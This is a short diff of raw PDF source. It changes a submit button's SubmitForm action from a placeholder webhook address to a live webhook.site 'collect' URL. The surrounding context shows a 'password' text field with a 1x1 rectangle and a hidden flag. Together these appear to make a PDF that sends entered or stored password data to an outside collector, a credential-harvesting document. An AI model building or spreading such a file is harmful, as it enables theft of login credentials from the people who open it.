@@ -41,7 +41,7 @@ endobj
 << /Type /Annot /Subtype /Widget /FT /Tx /T (password) /FF 4096 /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>
 endobj
 10 0 obj
-<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 /Rect [100 470 340 512] /F 4 /A << /S /SubmitForm /F (https://YOUR-WEBHOOK.example/collect) >> /MK << /BG [] /BC [] >> >>
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 /Rect [100 470 340 512] /F 4 /A << /S /SubmitForm /F (https://webhook.site/00b4e298-9186-4bdc-98b6-63763036de79/collect) >> /MK << /BG [] /BC [] >> >>
 endobj
 xref
 0 11
